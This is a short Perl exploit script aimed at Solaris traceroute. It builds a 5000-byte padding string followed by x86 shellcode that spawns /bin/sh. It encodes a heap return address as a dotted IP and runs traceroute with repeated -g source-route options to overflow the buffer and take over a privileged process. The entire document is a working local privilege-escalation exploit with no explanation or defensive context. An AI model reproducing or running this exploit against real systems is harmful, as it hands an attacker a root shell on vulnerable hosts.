#!/usr/bin/perl

$ret = 0x8046bb0;  # heap, solaris on amd64

$shellcode = "A" x 5000 .
"\xb8\xff\xf8\xff\x3c\xf7\xd0\x50\x31\xc0\xb0\x9a\x50\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68/bin\x89\xe3\x50\x53\x89\xe2\x50\x52\x53\xb0\x3b\xff\xd5";

$ip = sprintf("%d.%d.%d.%d", $ret & 0xff, ($ret & 0xff00) >> 8, ($ret &
0xff0000) >> 16, ($ret & 0xff000000) >> 24);

$cmd = "/usr/sbin/traceroute -g '$shellcode' -g 2 -g 3 -g 4 -g 5 -g 6 -g 7 -g 8
-g 9 -g 10 $ip";

print $cmd, "\n";

system($cmd);
